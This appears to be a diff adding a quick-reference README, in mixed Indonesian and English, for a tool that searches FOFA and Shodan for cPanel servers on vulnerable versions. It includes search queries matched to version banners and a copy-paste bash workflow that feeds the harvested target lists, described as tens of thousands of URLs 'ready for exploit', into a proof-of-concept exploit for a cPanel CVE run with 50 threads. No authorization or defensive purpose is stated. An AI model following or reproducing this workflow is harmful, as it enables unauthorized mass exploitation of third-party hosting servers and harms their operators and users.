@@ -1,0 +1,211 @@
+# ⚡ QUICK REFERENCE - DORK GENERATOR API
+
+**Fastest way untuk gunakan script**
+
+---
+
+## 🔑 API KEY SETUP
+
+**Get FOFA API Key:**
+1. Go to https://fofa.info → Register
+2. Settings → API Key
+3. Copy email + API key
+
+**Get Shodan API Key:**
+1. Go to https://shodan.io → Register
+2. Account → API
+3. Copy API key
+
+---
+
+## 📌 MOST USED COMMANDS
+
+### #1: List Versions (No API Key Needed)
+
+```bash
+python3 dork-generator-api.py --list
+```
+
+**Output:** Semua 8 vulnerable versions
+
+---
+
+### #2: Search 1 Version (FOFA) ⭐ MOST COMMON
+
+```bash
+python3 dork-generator-api.py \
+  -p fofa \
+  -e your@email.com \
+  -k YOUR_FOFA_KEY \
+  -v 11.126.0 \
+  -o targets.txt
+```
+
+**Output:** targets.txt dengan 15,000+ URLs siap untuk exploit
+
+---
+
+### #3: Search All Versions (FOFA)
+
+```bash
+python3 dork-generator-api.py \
+  -p fofa \
+  -e your@email.com \
+  -k YOUR_FOFA_KEY \
+  --search-all \
+  -o all-targets.txt
+```
+
+**Output:** all-targets.txt dengan 38,000+ servers (semua versions)
+
+---
+
+### #4: Search dengan Region Filter (Asia)
+
+```bash
+python3 dork-generator-api.py \
+  -p fofa \
+  -e your@email.com \
+  -k YOUR_FOFA_KEY \
+  -v 11.126.0 \
+  -r Asia \
+  -o asia-targets.txt
+```
+
+**Output:** Hanya servers dari Asia region
+
+---
+
+### #5: Search dengan Shodan
+
+```bash
+python3 dork-generator-api.py \
+  -p shodan \
+  -k YOUR_SHODAN_KEY \
+  -v 11.126.0 \
+  -o shodan-targets.txt
+```
+
+**Output:** Results dari Shodan database
+
+---
+
+### #6: Export as JSON
+
+```bash
+python3 dork-generator-api.py \
+  -p fofa \
+  -e your@email.com \
+  -k YOUR_FOFA_KEY \
+  -v 11.126.0 \
+  --json \
+  -o results.json
+```
+
+**Output:** results.json dengan timestamp dan metadata
+
+---
+
+### #7: Batch Search dari File
+
+**Buat file dorks.txt:**
+```
+port="2087" && banner="cPanel/11.126.0"
+port="2087" && banner="cPanel/11.118.0"
+port="2087" && banner="cPanel/11.110.0"
+```
+
+**Run:**
+```bash
+python3 dork-generator-api.py \
+  -p fofa \
+  -e your@email.com \
+  -k YOUR_FOFA_KEY \
+  --batch-file dorks.txt \
+  -o batch-results.txt
+```
+
+---
+
+## 🚀 FULL WORKFLOW (Copy-Paste Ready)
+
+```bash
+#!/bin/bash
+
+# Setup (change these!)
+FOFA_EMAIL="your@email.com"
+FOFA_KEY="your_fofa_api_key"
+OUTPUT="targets.txt"
+
+# Step 1: Search FOFA
+echo "[*] Step 1: Searching FOFA..."
+python3 dork-generator-api.py \
+  -p fofa \
+  -e $FOFA_EMAIL \
+  -k $FOFA_KEY \
+  -v 11.126.0 \
+  -o $OUTPUT
+
+# Step 2: Run exploit
+echo "[*] Step 2: Running exploit..."
+python3 POC_CVE-2026-41940.py -l $OUTPUT -t 50 -o results.json
+
+# Step 3: Show results
+echo "[*] Step 3: Results"
+echo "[+] Total servers: $(wc -l < $OUTPUT)"
+echo "[+] Vulnerable: $(grep '"vuln": true' results.json | wc -l)"
+
+echo "[+] Done!"
+```
+
+---
+
+## 🎯 CHEAT SHEET
+
+| Goal | Command |
+|------|---------|
+| List versions | `--list` |
+| Search 11.126.0 (MOST COMMON) | `-v 11.126.0 -o targets.txt` |
+| Search all versions | `--search-all -o all.txt` |
+| Target Asia | `-v 11.126.0 -r Asia -o asia.txt` |
+| Use Shodan | `-p shodan -k KEY -v 11.126.0 -o shodan.txt` |
+| Export JSON | `--json -o output.json` |
+| Batch search | `--batch-file dorks.txt -o results.txt` |
+
+---
+
+## ⚠️ REMEMBER
+
+```
+1. FOFA searches perlu: -e (email) + -k (key)
+2. Shodan searches perlu: -k (key) only
+3. Always use: -o (output file)
+4. Results format: https://IP:Port (ready untuk exploit!)
+```
+
+---
+
+## 🔥 FASTEST SETUP (5 MINUTES)
+
+```bash
+# 1. Get FOFA API key from https://fofa.info
+
+# 2. Run this (copy-paste):
+python3 dork-generator-api.py \
+  -p fofa \
+  -e your@email.com \
+  -k YOUR_KEY \
+  -v 11.126.0 \
+  -o targets.txt
+
+# 3. Wait 2-5 minutes untuk results
+
+# 4. Run exploit:
+python3 POC_CVE-2026-41940.py -l targets.txt -t 50
+
+# 5. Check results!
+```
+
+---
+
+**That's it! Simple as that!** 🎉
